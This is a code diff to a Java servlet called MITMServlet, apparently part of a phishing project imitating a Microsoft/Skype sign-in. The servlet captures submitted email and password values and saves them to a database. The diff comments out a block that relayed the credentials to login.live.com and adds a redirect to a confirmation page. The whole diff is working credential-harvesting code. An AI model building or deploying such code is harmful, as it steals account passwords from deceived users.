@@ -5,6 +5,7 @@ import br.edu.ifpb.mitm.dao.DataDao;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.sql.SQLException;
+import javax.servlet.RequestDispatcher;
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
 import javax.servlet.http.HttpServlet;
@@ -49,37 +50,40 @@ public class MITMServlet extends HttpServlet {
             throws ServletException, IOException {
 
         if (request.getParameter("mitm") != null) {
-            String url = "https://login.live.com/ppsecure/post.srf?wa=wsignin1"
-                    + ".0&rpsnv=13&ct=1535064396&rver=7.0.6730.0&wp=MBI_SSL&w"
-                    + "reply=https://lw.skype.com/login/oauth/proxy?client_"
-                    + "id=578134&redirect_uri=https%3A%2F%2Fweb.skype.com&int"
-                    + "src=client-_-webapp-_-production-_-go-signin&site_name="
-                    + "lw.skype.com&lc=1033&id=293290&mkt=en&psi=skype&lw=1&"
-                    + "cobrandid=2befc4b5-19e3-46e8-8347-77317a16a5a5&client_"
-                    + "flight=hsu,ReservedFlight33,ReservedFlight67&contextid="
-                    + "615B96C66E3E15FF&bk=1535064396&uaid=454780bfcf1a4e44aaf"
-                   + "bfbf84480332b&pid=0";
-
-            Client client = ClientBuilder.newClient();
-            WebTarget target = client.target(url);
-
-            Form form = new Form();
-            form.param("login", request.getParameter("email"));
-            form.param("passwd", request.getParameter("senha"));
-
-            Response res = target
-                    .request()
-                    .post(Entity.form(form), Response.class);
-            System.out.println(res.getHeaderString(url));
+//            String url = "https://login.live.com/ppsecure/post.srf?wa=wsignin1"
+//                    + ".0&rpsnv=13&ct=1535064396&rver=7.0.6730.0&wp=MBI_SSL&w"
+//                    + "reply=https://lw.skype.com/login/oauth/proxy?client_"
+//                    + "id=578134&redirect_uri=https%3A%2F%2Fweb.skype.com&int"
+//                    + "src=client-_-webapp-_-production-_-go-signin&site_name="
+//                    + "lw.skype.com&lc=1033&id=293290&mkt=en&psi=skype&lw=1&"
+//                    + "cobrandid=2befc4b5-19e3-46e8-8347-77317a16a5a5&client_"
+//                    + "flight=hsu,ReservedFlight33,ReservedFlight67&contextid="
+//                    + "615B96C66E3E15FF&bk=1535064396&uaid=454780bfcf1a4e44aaf"
+//                   + "bfbf84480332b&pid=0";
+//
+//            Client client = ClientBuilder.newClient();
+//            WebTarget target = client.target(url);
+//
+//            Form form = new Form();
+//            form.param("login", request.getParameter("email"));
+//            form.param("passwd", request.getParameter("senha"));
+//
+//            Response res = target
+//                    .request()
+//                    .post(Entity.form(form), Response.class);
+//            System.out.println(res.getHeaderString(url));
 
             try {
                 new DataDao().persist(
                         request.getParameter("email"),
                         request.getParameter("senha")
                 );
+
+                request.getRequestDispatcher("senha.jsp?ok=1").forward(request, response);
             } catch (SQLException | ClassNotFoundException ex) {
                 ex.printStackTrace();
             }
+
 
         } else {
             request.setAttribute("email", request.getParameter("email"));
